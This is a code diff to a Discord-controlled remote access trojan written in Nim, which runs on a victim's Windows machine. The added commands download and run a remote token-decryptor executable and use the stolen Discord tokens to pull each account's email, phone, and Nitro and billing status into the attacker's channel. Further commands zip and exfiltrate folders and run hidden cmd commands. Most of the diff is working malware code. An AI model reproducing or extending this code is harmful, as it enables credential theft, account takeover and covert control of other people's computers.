@@ -1,4 +1,4 @@
-import dimscord, asyncdispatch, options, os, strutils, sequtils, sets, httpclient, streams, osproc, winim/lean, modules/[audio, clipboard, config, screenshot], json
+import dimscord, asyncdispatch, options, os, strutils, sequtils, sets, httpclient, streams, osproc, winim/lean, modules/[audio, clipboard, config, screenshot], json, zippy/ziparchives
 
 var thisTarget = getenv("username") & "@" & getenv("computername")
 var selectedTarget: string
@@ -12,15 +12,16 @@ const helpMessage = """
 `.select <username/all>` - select current target
 
 **__Grabber__**
-`.discord` - collect all discord tokens
+`.discord` - send all discord tokens
+`.discordinfo` - send all discord tokens with info
 
 **__File Management__**
 `.upload <attachment>` - upload file(s) to target (AppData\Local\Temp)
-`.download <path>` - download file from target 
-`.rm <path>` - delete file 
-`.rmdir <path>` - delete directory with all its contents
+`.dfile <path>` - download file from target 
+`.dfolder <path>` - download a folder (.zip) from target
 
 **__System__**
+`.cmd <command>` - execute silent cmd command
 `.shell <command>` - execute silent powershell command
 `.startup` - add payload to startup
 
@@ -102,6 +103,91 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
             except CatchableError as e:
                 discard await discord.api.sendMessage(m.channel_id, "Error decrypting tokens!\n" & e.msg)
 
+        elif (m.content == ".discordinfo"):
+            discard await discord.api.sendMessage(m.channel_id, "Collecting tokens...")
+            let decryptorPath = getTempDir() / "tokens.exe"
+            try:
+                var
+                    client = newHttpClient()
+                    response = client.get(tokenDecryptorUrl)
+                    f = newFileStream(decryptorPath, fmWrite)
+                f.write(response.body)
+                f.close()
+            except:
+                discard await discord.api.sendMessage(m.channel_id, "Error downloading decryptor!\n" & tokenDecryptorUrl)
+            try:
+                let res = execProcess(decryptorPath, options = {poStdErrToStdOut, poUsePath})
+                let tokens = res.strip().split(", ")
+
+                var filteredTokens: seq[string]
+                for a in tokens:
+                    filteredTokens.add(a.replace("\"", "").replace("[", "").replace("]", ""))
+
+                filteredTokens = toSeq(toSet(filteredTokens))
+
+                for token in filteredTokens:
+                    let headers = newHttpHeaders({
+                        "Authorization": token,
+                        "Content-Type": "application/json"
+                    })
+
+                    var client = newHttpClient()
+                    var response = client.request("https://discordapp.com/api/v6/users/@me", headers = headers)
+                    
+                    if response.status.startsWith("401"):
+                        discard await discord.api.sendMessage(m.channel_id, "Token `" & token & "` is invalid!")
+                        continue
+
+                    if response.status == "200 OK":
+                        let jsonResponse = parseJson(response.body)
+                        let email = jsonResponse["email"].getStr()
+                        var phone = jsonResponse["phone"].getStr()
+                        if phone == "":
+                            phone = "No phone number"
+                        let userid = jsonResponse["id"].getStr()
+                        let username = jsonResponse["username"].getStr() & "#" & jsonResponse["discriminator"].getStr()
+                        let avatar = "https://cdn.discordapp.com/avatars/" & jsonResponse["id"].getStr() & "/" & jsonResponse["avatar"].getStr()
+
+                        let nitroResp = client.request("https://discordapp.com/api/v6/users/@me/billing/subscriptions", headers = headers)
+                        let nitro = $((parseJson(nitroResp.body)).len > 0)
+
+                        let billingResp = client.request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers = headers)
+                        let billing = $((parseJson(billingResp.body)).len > 0)
+                        var embed = Embed(
+                            title: some "User info",
+                            image: some EmbedImage(url: avatar),
+                            fields: some @[
+                                EmbedField(
+                                    name: "Token",
+                                    value: "`" & token & "`"
+                                ),
+                                EmbedField(
+                                    name: "Email",
+                                    value: email
+                                ),
+                                EmbedField(
+                                    name: "Phone number",
+                                    value: phone
+                                ),
+                                EmbedField(
+                                    name: "Username",
+                                    value: username & " (" & userid & ")"
+                                ),
+                                EmbedField(
+                                    name: "Nitro",
+                                    value: nitro
+                                ),
+                                EmbedField(
+                                    name: "Billing",
+                                    value: billing
+                                )
+                            ]
+                        )
+                        discard await discord.api.sendMessage(m.channel_id, embeds = @[embed])
+
+            except Exception as e:
+                discard await discord.api.sendMessage(m.channel_id, "Error decrypting tokens!\n" & e.msg)
+
 
         elif (m.content == ".upload"):
             discard await discord.api.sendMessage(m.channel_id, "Uploading...")
@@ -116,13 +202,23 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
                 f.close()
                 discard await discord.api.sendMessage(m.channel_id, "Uploaded **" & filename & "** to **" & thisTarget & "**")
 
-        elif (m.content.startsWith(".download")):
+        elif (m.content.startsWith(".dfile")):
             discard await discord.api.sendMessage(m.channel_id, "Downloading...")
             try:
                 var path = split(m.content, " ")[1]
                 discard await discord.api.sendMessage(m.channel_id, "Downloaded from **" & thisTarget & "**", files = @[DiscordFile(name: path)])
             except:
                 discard await discord.api.sendMessage(m.channel_id, "File not found!")
+
+        elif (m.content.startsWith(".dfolder")):
+            discard await discord.api.sendMessage(m.channel_id, "Downloading...")
+            try:
+                var path = split(m.content, " ")[1]
+                let archivePath = joinPath(getTempDir(), "archive.zip")
+                createZipArchive(path, archivePath)
+                discard await discord.api.sendMessage(m.channel_id, "Downloaded from **" & thisTarget & "**", files = @[DiscordFile(name: archivePath)])
+            except:
+                discard await discord.api.sendMessage(m.channel_id, "Folder not found!")
 
         elif (m.content.startsWith(".record")):
             discard await discord.api.sendMessage(m.channel_id, "Recording...")
@@ -164,6 +260,26 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
             except:
                 discard await discord.api.sendMessage(m.channel_id, "Something went wrong!")
 
+        elif (m.content.startswith(".cmd")):
+            discard await discord.api.sendMessage(m.channel_id, "Running command...")
+            var 
+                command = m.content[4 .. m.content.high]
+                outp = execProcess("cmd.exe /c " & command , options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
+            
+            if outp.len() < 2000:
+                try:
+                    if outp == "":
+                        outp = "No output"
+                    discard await discord.api.sendMessage(m.channel_id, "Ran `" & command & "` on **" & thisTarget & "**\nOutput:\n```" & outp & "```")
+                except:
+                    discard await discord.api.sendMessage(m.channel_id, "Ran `" & command & "` on **" & thisTarget & "** but no output size is too big.")
+            else:
+                var f = newFileStream("output.txt", fmWrite)
+                f.write(outp)
+                f.close()
+                discard await discord.api.sendMessage(m.channel_id, "Output from **" & thisTarget & "**.", files = @[DiscordFile(name: "output.txt")])
+                os.removeFile("output.txt")
+
         elif (m.content.startswith(".shell")):
             discard await discord.api.sendMessage(m.channel_id, "Running command...")
             var 
@@ -183,24 +299,6 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
                 f.close()
                 discard await discord.api.sendMessage(m.channel_id, "Output from **" & thisTarget & "**.", files = @[DiscordFile(name: "output.txt")])
                 os.removeFile("output.txt")
-
-        elif (m.content.startsWith(".rm")):
-            discard await discord.api.sendMessage(m.channel_id, "Removing...")
-            try:
-                var path = split(m.content, " ")[1]
-                os.removeFile(path)
-                discard await discord.api.sendMessage(m.channel_id, "Removed file " & path & " from **" & thisTarget & "**")
-            except:
-                discard await discord.api.sendMessage(m.channel_id, "File not found!")
-
-        elif (m.content.startsWith(".rmdir")):
-            discard await discord.api.sendMessage(m.channel_id, "Removing...")
-            try:
-                var path = split(m.content, " ")[1]
-                deleteDirRecursively(path)
-                discard await discord.api.sendMessage(m.channel_id, "Removed directory  " & path & " from **" & thisTarget & "**")
-            except:
-                discard await discord.api.sendMessage(m.channel_id, "Directory not found!")
 
 
 waitFor discord.startSession(
